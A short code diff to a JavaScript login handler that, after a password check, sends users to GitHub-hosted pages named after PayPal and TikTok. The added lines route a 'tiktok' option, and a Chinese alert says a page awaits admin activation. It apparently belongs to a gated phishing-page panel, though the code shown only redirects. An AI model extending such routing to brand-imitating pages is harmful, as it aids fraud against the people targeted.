@@ -20,6 +20,8 @@ loginForm.addEventListener('submit', function (e) {
         } else if (version === 'paypal_mobile'){
           //  window.location.href = 'https://jongaha.github.io/paypal_m/';
             alert('网页未开通，请联系管理员开通网页！')
+        } else if (version === 'tiktok'){
+            window.location.href = 'https://jongaha.github.io/tiktok/';
         }
     } else {
         alert('Wrong password. Please try again.');
